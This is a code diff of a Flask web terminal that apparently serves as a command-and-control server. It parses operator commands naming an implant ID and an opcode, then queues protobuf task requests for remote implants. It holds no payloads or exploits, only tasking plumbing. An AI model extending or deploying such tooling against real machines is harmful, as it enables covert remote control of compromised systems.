@@ -6,7 +6,7 @@ from wtforms.validators import DataRequired, Length
 from cvnt.client_pb2 import *
 from urllib.parse import urljoin
 from cvnt.client_pb2 import Command, ClientTaskRequest, ClientTaskResponse, Packet
-from cvnt.constants import opcodes, server_commands, to_opcode
+from cvnt.constants import *
 from cvnt.database import db
 from cvnt.db_operations import make_task, get_list, get_implant_by_id
 
@@ -38,10 +38,10 @@ def index():
         response = "Welcome to the party :)"
     return render_template('terminal.html', form=form, cmd=whole, implants=implants, response=response)
 
+# parses the command inputted into the terminal and handles server request
 def analyze_input(form):
     whole = form.cmd.data
     words = whole.split()
-    rest_string = ''
     if len(words) == 1:
         if words[0] in server_commands:
             print('printing??????')
@@ -49,25 +49,22 @@ def analyze_input(form):
         else:
             response = 'Invalid Command Loser :('
             cmd = words[0]
-    elif len(words) == 2:
-        if words[1] in opcodes:
+    elif words[1] in opcodes:
+        main_op = OPCODE_STDLIB
+        rest_string = str(to_opcode(words[1]))
+        if len(words) == 2:
             implant_id = words[0]
-            cmd = words[1]
-            response = handle_task_request(implant_id, cmd, rest_string)
+            response = handle_task_request(implant_id, main_op, rest_string)
         else:
-            response = 'Invalid Command Loser :('
-            cmd = ' '.join(words)
-    else:
-        if words[1] in opcodes:
             first_two_words = words[:2]
             implant_id = first_two_words[0]
-            cmd = first_two_words[1]
+            cmd = str(to_opcode(first_two_words[1]))
             rest_of_words = words[2:]
-            rest_string = ' '.join(rest_of_words)
-            response = handle_task_request(implant_id, cmd, rest_string)
-        else:
-            response = 'Invalid Command Loser :(' 
-            cmd = ' '.join(words)
+            rest_string = cmd + rest_string.join(rest_of_words)
+            response = handle_task_request(implant_id, main_op, rest_string)
+    else:
+        response = 'Invalid Command Loser :(' 
+        cmd = ' '.join(words)
     return response
 
 def handle_local_request(cmd, args):
@@ -78,8 +75,8 @@ def handle_local_request(cmd, args):
 def handle_task_request(implant_id, cmd, args):
     tr = TaskRequest()
     print(f'REQUEST FROM CLIENT')
-    tr.TaskID = str(random.randint(10, 10000))
-    tr.Opcode = to_opcode(cmd)
+    tr.TaskID = random.randint(10, 10000)
+    tr.Opcode = cmd
     tr.Args = args
     new_task = make_task(implant_id, tr)
     print("NEW TASK MADE:")
@@ -108,3 +105,4 @@ def handle_packet(msg, csrf):
     r.CSRF = csrf
     out = r.SerializeToString()
 #    r = requests.post(urljoin( c2, csrf), data = out)
+
